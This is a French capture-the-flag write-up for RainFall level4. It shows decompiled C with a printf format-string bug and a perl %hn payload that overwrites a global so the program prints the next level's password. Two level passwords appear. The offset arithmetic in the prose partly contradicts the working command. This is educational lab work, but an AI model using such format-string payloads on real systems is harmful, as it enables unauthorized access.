# level4 :

pass : `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`

## Source :

```c=
#include <stdio.h>

void	p(char *str) {
	printf(str);
}

void	n() {
	// char *fgets(char *s, int size, FILE *stream);
	char str[520];  // 0x208
	fgets(str, 512, stdin);  // 0x200
	p(str);
	void	*m = 0x8049810;  // bss segment finish at 0x08049814
	if (m == 0x1025544) {
		system("/bin/cat /home/user/level5/.pass");
	}
}

void	main() {
	n();
}
```

## Recherche :

Comme pour le level3, on cheche l'offset qui est cette fois à `12`

```
kali@kali:~/rainfall$ ./script.sh ./level4
Index 0
Index 1
Index 2
Index 3
Index 4
Index 5
Index 6
Index 7
Index 8
Index 9
Index 10
Index 11
Index 12
AAAA41414141
```

Cette fois on veut :
- écrire à l'addresse `0x08049810`
- l'offset pour y écrire est `12`
- la valeur que l'on veut mettre est `0x1025544`

Pour mettre cette valeur, on utilisera `%hn` qui permet d'écrire sur `2` octets.

Donc `0x5544` `0x08049810` et `0x0102` `0x08049812`
pour le little endian on a
Comme `0x5544` > `0x0102`, on les écrira dans l'ordre inverse.
- `0x0102` - `8 bits d'adresses` = `250`
- `0x5544` - `0x0102` = `21570`

On a doit dont décalé de 513 - 8 = 505 pour le second, puis de 17493 - 513 = 16980 pour le premier.

`./level4 < <(perl -e 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12\$hn%16980x%13\$hn"')`

## Exploit :

```
level4@RainFall:~$ ./level4 < <(perl -e 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12\$hn%21570x%13\$hn"')

.
.
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

----

## Documentation :
* [Une simple Exploitation de vulnérabilité Format String](https://www.exploit-db.com/papers/23985)
